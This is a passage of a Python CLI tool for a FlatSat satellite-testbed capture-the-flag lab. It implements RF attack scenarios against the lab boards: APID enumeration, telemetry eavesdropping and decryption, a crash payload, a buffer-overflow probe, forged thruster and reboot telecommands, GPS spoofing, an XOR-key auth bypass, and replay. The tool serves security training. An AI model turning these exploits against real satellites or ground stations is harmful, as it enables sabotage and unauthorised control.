    from modules.core.constants import ATTACK_LED_FEEDBACK, ATTACK_LED_HOLD_MS

    entry = ATTACK_LED_FEEDBACK.get(apid)
    if not entry:
        return
    name, (r, g, b) = entry
    print_info(
        f"Watch the target NeoPixel: it should turn {name} (RGB {r},{g},{b}) "
        f"for ~{ATTACK_LED_HOLD_MS // 1000}s, then fall back to its idle colour."
    )


def _confirm(label, assume_yes):
    """Ask before running a destructive scenario.

    These scenarios reboot, crash or actuate the board, and the RF variants go
    out over the air, so they must not fire from a stray keystroke.
    """
    if assume_yes:
        return
    print_warning(f"{label} will affect the attached board (and transmit over RF).")
    if not click.confirm("Continue?", default=False):
        _fail("Aborted by user. (Tip: Use --yes to skip confirmation, e.g., 'flatsat attack resetc --yes')")


def _require_uplink(dev):
    """Block RF scenarios on a board that cannot transmit.

    A satellite has no uplink radio, so a 'transmit' scenario would silently do
    nothing; failing here says so instead.
    """
    if not getattr(dev, "has_radio1", True):
        _fail("This board has no uplink radio (Radio 1), so it cannot transmit telecommands.")


def _attack_frame(apid, payload, seq_count: int | None = None):
    """Build one attack telecommand frame the way the upstream scripts do.

    The payload goes out in the clear, matching
    flat-sat-fw-interno/Attacks/lib/pwnsat_packets.py. That is deliberate and
    is *not* a missing-encryption bug: the firmware dispatches the CTF suite
    from the plaintext APID in the CCSDS primary header, before any SDLS
    decryption (attacks.c runs ahead of process_incoming_telecommand on the RX
    path). Encrypting here would be wrong twice over — the LED feedback still
    keys off the clear header, and the gs-auth scenario pre-encrypts its
    payload for the firmware to XOR a second time.

    Only genuinely SDLS-protected telecommands (`flatsat tc`, `flatsat
    transmit --protect`) go through sdls_protect_frame.
    """
    from modules.core.ccsds import build_tc

    seq = seq_count if seq_count is not None else ((int(time.time() * 10)) & 0x3FFF or 1)
    return build_tc(apid, payload, seq_count=seq, timestamp=int(time.time()))


def _send_attack_frame(dev, difficulty, apid, payload, seq_count: int | None = None):
    """Transmit one attack frame, failing the command when it does not go out."""
    frame = _attack_frame(apid, payload, seq_count=seq_count)
    if not _deliver_frame(_open_bridge(dev, difficulty), frame, ""):
        _fail(f"Attack frame for APID 0x{apid:03X} was not transmitted.")
    _report_led_expectation(apid)




@cli.command("tc")
@click.argument("apid", type=ApidType())
@click.argument("payload", required=False, default="")
@click.option("--text", "as_text", is_flag=True, help="Interpret PAYLOAD as plain text instead of hex.")
@click.option("--protect", is_flag=True, help="Apply SDLS protection before transmitting.")
@click.option("--seq", type=click.IntRange(0, 0x3FFF), default=None,
              help="Sequence counter (default: derived from the clock).")
@click.option("--timestamp", type=click.IntRange(0, 0xFFFFFFFF), default=None,
              help="MET timestamp; also the SDLS AES IV (default: current time).")
@click.option("--repeat", type=click.IntRange(1), default=1, show_default=True, help="Times to transmit.")
@click.option("--delay", type=float, default=1.0, show_default=True, help="Seconds between repeats.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level when --protect is set. Defaults to the board's difficulty.")
@with_device
def tc(dev, apid, payload, as_text, protect, seq, timestamp, repeat, delay, difficulty_override):
    """Send a CCSDS telecommand to an arbitrary APID over RF

    \b
        flatsat tc 0x04 0164              # SET_THRUSTER at 100% power
        flatsat tc 0x20 --text "PING"     # text payload
        flatsat tc 0x01 1000 --protect    # SDLS-protected telecommand

    The MET timestamp is used by the firmware as the SDLS AES IV, so it defaults
    to the current time rather than 0; override it with --timestamp when
    reproducing a captured frame.
    """
    from modules.core.ccsds import build_tc, sdls_protect_frame

    try:
        raw_payload = _encode_payload(payload, as_text) if payload else b""
    except ValueError:
        _fail("Invalid hex string. Use --text to send plain text, or pass valid hex.")

    if not raw_payload:
        _fail("Empty payload, nothing to transmit.")

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    bridge = _open_bridge(dev, diff)

    sent = 0
    for i in range(repeat):
        ts = timestamp if timestamp is not None else int(time.time())
        seq_count = seq if seq is not None else ((int(time.time() * 10) + i) & 0x3FFF or 1)
        frame = build_tc(apid, raw_payload, seq_count=seq_count, timestamp=ts)
        if protect:
            frame = sdls_protect_frame(frame, diff)

        label = f"Transmission {i + 1}/{repeat}: " if repeat > 1 else ""
        if _deliver_frame(bridge, frame, label):
            sent += 1

        if i < repeat - 1:
            time.sleep(delay)

    if sent < repeat:
        print_error(f"Transmitted APID 0x{apid:03X} {sent}/{repeat} times.")
        raise click.exceptions.Exit(1)

    kind = "text" if as_text else "hex"
    sdls_note = f", SDLS level {diff}" if protect else ""
    print_success(f"Sent APID 0x{apid:03X}: {len(raw_payload)} bytes of {kind} payload{sdls_note}.")


@cli.group("attack", context_settings={"help_option_names": ["-h", "--help"]})
@click.option("-d", "--device", default=None, help=DEVICE_HELP)
@click.option("-p", "--port", default=None, help=PORT_HELP)
@click.pass_context
def attack(ctx, device, port):
    """Run the FlatSat CTF attack scenarios (firmware telecommand layer).

    Scenarios mirror flat-sat-fw-interno/Attacks/. They act on the attached
    board and the RF variants transmit over the air, so each one asks for
    confirmation unless --yes is given.

    With two boards connected, pick the TRANSMITTING one (the ground station):
    the attack is sent over RF to the other board, and only the target shows
    the NeoPixel feedback. The target's SDLS level is sniffed automatically.

    \b
        flatsat attack -d 0 resetc --yes      # attack from board 0
        flatsat -d 0 attack resetc --yes      # same thing
    """
    # Only override what was actually given, so `flatsat -d 0 attack ...` (set
    # on the root group) is not clobbered by this group defaulting to None.
    opts = dict(ctx.obj or {})
    if device is not None:
        opts["device"] = device
    if port is not None:
        opts["port"] = port
    ctx.obj = opts


@attack.command("apid-enum")
@click.option("--high", type=click.IntRange(0, 0x7FF), default=0x1F,
              help="Highest APID to probe (default 0x1F).")
@click.option("--delay", type=float, default=0.1, show_default=True, help="Seconds between probes.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_apid_enum(dev, high, delay, difficulty_override, yes):
    """Attack 00: unauthenticated black-box APID enumeration (0x00..0x1F)."""
    _confirm("APID enumeration", yes)
    _require_uplink(dev)

    diff, diff_source = _resolve_difficulty(dev, difficulty_override, sniff=False)
    bridge = _open_bridge(dev, diff)

    print_info(f"Probing APIDs 0x00..0x{high:02X} over RF ({high + 1} plaintext probes)...")
    sent = 0
    for apid in range(0x00, high + 1):
        print_dim(f" -> APID 0x{apid:02X}")
        frame = _attack_frame(apid, b"\x00", seq_count=apid + 1)
        if _deliver_frame(bridge, frame, ""):
            sent += 1
        if delay:
            time.sleep(delay)

    if sent < high + 1:
        _fail(f"Only {sent}/{high + 1} APID probes were transmitted.")

    print_success("APID enumeration complete. Watch the board: lit LEDs mark live APIDs.")


@attack.command("eavesdrop")
@click.option("-t", "--duration", type=float, default=5.0, show_default=True,
              help="Seconds to listen on the downlink.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level used to decrypt payloads. Defaults to the target's level, sniffed from its heartbeat.")
@with_device
def attack_eavesdrop(dev, duration, difficulty_override):
    """Attack 01: passive downlink capture and SDLS decryption.

    Read-only: it only listens. Demonstrates that the static AES-128 key lets
    anyone decrypt the telemetry stream.
    """
    from modules.core.ccsds import detect_tm_difficulty
    from modules.core.device import parse_lora_rx

    diff, diff_source = _resolve_difficulty(dev, difficulty_override, sniff=False)
    print_info(f"Listening to the telemetry downlink for {duration:g}s (SDLS level {diff})...")

    frames = []
    start = time.time()
    try:
        while time.time() - start < duration:
            line = dev.read_line_from_radio(0, timeout=1.0)
            if not line:
                continue
            parsed = parse_lora_rx(line)
            if not parsed:
                continue
            if difficulty_override is None:
                try:
                    auto = detect_tm_difficulty(bytes.fromhex(parsed["data"]))
                    if auto is not None:
                        diff = auto
                except Exception:
                    pass
            entry = _frame_entry(parsed, diff)
            if entry:
                frames.append(entry)
                print_success(
                    f"#{len(frames)}: {entry['type']} APID=0x{entry['apid']:03X} "
                    f"seq={entry['seq']} CRC={'OK' if entry['crc_valid'] else 'FAIL'} ({entry['length']} bytes)"
                )
    except KeyboardInterrupt:
        print_warning("Eavesdropping stopped by user.")

    if not frames:
        _fail("No CCSDS frames captured on the downlink.")
    print_success(f"Captured and decrypted {len(frames)} downlink frame(s).")


@attack.command("fuzz-crash")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_fuzz_crash(dev, difficulty_override, yes):
    """Attack 02: BROADCAST_MSG integer-underflow crash (APID 0x06)."""
    _confirm("Fuzzing crash (this crashes the board's broadcaster)", yes)
    _require_uplink(dev)

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    _send_attack_frame(dev, diff, APID_TC_BROADCAST, b"\xFF\x00\xFF\xFF")


@attack.command("mem-overflow")
@click.option("--size", type=click.IntRange(1, 225), default=64, show_default=True,
              help="Payload size; must exceed the firmware's 32-byte buffer.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_mem_overflow(dev, size, difficulty_override, yes):
    """Reto 3.3: DIAG_MEM stack overflow probe (APID 0x31)."""
    _confirm("Memory diagnostic overflow probe", yes)
    if size <= 32:
        _fail("--size must be greater than 32 to overflow the firmware buffer.")
    _require_uplink(dev)

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    print_info(f"Sending a {size}-byte payload to APID 0x31 (DIAG_MEM)...")
    _send_attack_frame(dev, diff, APID_TC_DIAG_MEM, b"A" * size)


@attack.command("cmd-injection")
@click.option("--power", type=click.IntRange(0, 100), default=100, show_default=True,
              help="Thrust power percentage.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_cmd_injection(dev, power, difficulty_override, yes):
    """Attack 03: unauthenticated SET_THRUSTER command injection (APID 0x04)."""
    _confirm("Unauthenticated thruster command injection", yes)
    _require_uplink(dev)

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    print_info(f"Forging SET_THRUSTER at {power}% power...")
    _send_attack_frame(dev, diff, APID_TC_SET_THRUSTER, bytes([0x01, power]))


@attack.command("gps-spoof")
@click.option("--nmea", default=None,
              help="NMEA sentence to inject. Defaults to a fixed 12:35:19 fix.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_gps_spoof(dev, nmea, difficulty_override, yes):
    """Attack 04: GPS position spoofing.

    Note: attacks.h defines no APID for this scenario. The upstream script
    reuses 0x004 (SET_THRUSTER), so the firmware routes this to the thruster
    handler; only the LED feedback proves it arrived. Real GPS L1 spoofing
    (1575.42 MHz) would need an SDR and is out of scope here.
    """
    _confirm("GPS NMEA spoofing probe", yes)
    _require_uplink(dev)

    sentence = nmea or "$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n"
    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    print_info(f"Injecting NMEA: {sentence.strip()}")
    _send_attack_frame(dev, diff, APID_TC_SET_THRUSTER, sentence.encode("utf-8"))


@attack.command("gs-auth")
@click.option("--payload", default="AUTH_ADMIN_OVERRIDE", show_default=True,
              help="Plaintext to forge.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_gs_auth(dev, payload, difficulty_override, yes):
    """Attack 05: ground-station auth bypass via the static XOR key (APID 0x12).

    Encrypts PAYLOAD with the hardcoded 6-byte XOR key the firmware uses, which
    is what makes the bypass possible.
    """
    _confirm("Ground-station authentication bypass", yes)
    _require_uplink(dev)

    raw = payload.encode("utf-8")
    encrypted = bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(raw))
    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    print_info(f"Forging APID 0x12 with '{payload}' XOR-encrypted under the static key...")
    _send_attack_frame(dev, diff, APID_TC_GS_AUTH_XOR, encrypted)


@attack.command("replay-tc")
@click.option("--payload", default="1000", show_default=True, help="Hex payload of the replayed telecommand.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_replay_tc(dev, payload, difficulty_override, yes):
    """Attack 06: telecommand replay, no anti-replay protection (APID 0x01)."""
    _confirm("Telecommand replay", yes)
    _require_uplink(dev)

    try:
        raw_payload = bytes.fromhex(payload.replace(" ", ""))
    except ValueError:
        _fail(f"Invalid hex payload: {payload}")

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    print_info("Re-transmitting a captured telecommand frame...")
    _send_attack_frame(dev, diff, APID_TC_REPLAY, raw_payload)


@attack.command("resetc")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level for the RF telecommand. Defaults to the target's level, sniffed from its heartbeat.")
@click.option("--yes", is_flag=True, help="Do not ask for confirmation.")
@with_device
def attack_resetc(dev, difficulty_override, yes):
    """Attack 07: unauthenticated RESETC hardware reboot (APID 0x02)."""
    _confirm("Unauthenticated hardware reboot (the board will disconnect)", yes)
    _require_uplink(dev)

    diff, diff_source = _resolve_difficulty(dev, difficulty_override)
    _send_attack_frame(dev, diff, APID_TC_RESETC, b"RESETC")



# ==============================================================================
# TAB COMPLETION COMMAND GROUP
# ==============================================================================

@cli.group("completion", context_settings={"help_option_names": ["-h", "--help"]})
def completion():
    """Install shell tab completion for flatsat."""


@completion.command("install")
@click.option(
    "--shell",
    type=click.Choice(["bash", "zsh", "fish"]),
    default=None,
    help="Shell to install completion for (auto-detected if omitted).",
)
def completion_install(shell):
    """Install tab completion for your shell."""
    if platform.system() == "Windows":
        print_error("Shell completion is not supported on Windows.")
        sys.exit(1)

    if shell is None:
        shell_env = os.environ.get("SHELL", "")
        if "zsh" in shell_env:
            shell = "zsh"
        elif "fish" in shell_env:
            shell = "fish"
        elif "bash" in shell_env:
            shell = "bash"
        else:
            print_error("Could not detect shell. Use --shell bash|zsh|fish.")
            sys.exit(1)
        print_info(f"Detected shell: {shell}")

    script_abs = str(Path(sys.argv[0]).resolve())
    python_abs = sys.executable
    prog_name = "flatsat"
    env_var = "_FLATSAT_COMPLETE"

    if shell == "bash":
        target = Path.home() / ".local" / "share" / "bash-completion" / "completions" / prog_name
        source_flag = "bash_source"
        rc_note = None
    elif shell == "zsh":
        target = Path.home() / ".zfunc" / f"_{prog_name}"
        source_flag = "zsh_source"
        rc_note = "fpath=(~/.zfunc $fpath)\nautoload -Uz compinit && compinit"
    elif shell == "fish":
        target = Path.home() / ".config" / "fish" / "completions" / f"{prog_name}.fish"
        source_flag = "fish_source"
        rc_note = None

    # Only extend PYTHONPATH when the package is not already importable, i.e.
    # when running straight from a source checkout. parent.parent.parent is the
    # repo root in that case, but in an installed wheel or a PyInstaller bundle
    # it is site-packages' parent, which would put the wrong directory on the
    # path and could shadow the installed package.
    env = {**os.environ, env_var: source_flag}
    if importlib.util.find_spec("modules") is None:
        root_dir = str(Path(__file__).resolve().parent.parent.parent)
        env["PYTHONPATH"] = root_dir + os.pathsep + env.get("PYTHONPATH", "")

    try:
        res = subprocess.run(  # noqa: S603 - fixed argv list, no shell, no user input
            [python_abs, script_abs],
            env=env,
            capture_output=True,
            text=True,
        )
        comp_script = res.stdout
    except Exception as e:
        print_error(f"Failed to generate completion script: {e}")
        sys.exit(1)

    if not comp_script.strip():
        print_error("Empty completion script generated.")
        sys.exit(1)

    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(comp_script)
    print_success(f"Completion script written to: {target}")

    if rc_note:
        zshrc = Path.home() / ".zshrc"
        existing = zshrc.read_text() if zshrc.exists() else ""
        if ".zfunc" not in existing:
            with zshrc.open("a") as f:
                f.write(f"\n# flatsat tab completion\n{rc_note}\n")
            print_success(f"Added fpath entry to {zshrc}")

    print_empty_line()
    if shell == "bash":
        print_info("Restart your shell or run:")
        print_dim(f"source {target}")
    elif shell == "zsh":
        print_info("Restart your shell or run:")
        print_dim("source ~/.zshrc && compinit -u")
    else:  # fish picks the file up on its own
        print_info("Restart your shell or run:")
        print_dim(f"source {target}")


# ==============================================================================
# ENTRY POINT
# ==============================================================================

def main_cli() -> None:
    main()


def _first_subcommand(argv):
    """Return the first argv token that names a real subcommand, else None.

    Picking "the first token that does not start with -" is wrong: for
    `flatsat -d 0 status` that is "0", so the banner would label itself
    "flatsat 0".
    """
    for arg in argv:
        if arg in cli.commands:
            return arg
    return None


def main() -> None:
    if not os.environ.get("_FLATSAT_COMPLETE"):
        print_banner(_first_subcommand(sys.argv[1:]))
    cli(prog_name="flatsat")


__all__ = [
    "cli",
    "devices",
    "status",
    "sensors",
    "color",
    "difficulty",
    "identify",
    "reboot",
    "cmd",
    "console_cmd",
    "mode",
    "flight",
    "config",
    "sniff",
    "replay",
    "transmit",
    "tc",
    "attack",
    "completion",
    "main",
    "main_cli",
    "_detect_local_role",
]


if __name__ == "__main__":
    main_cli()
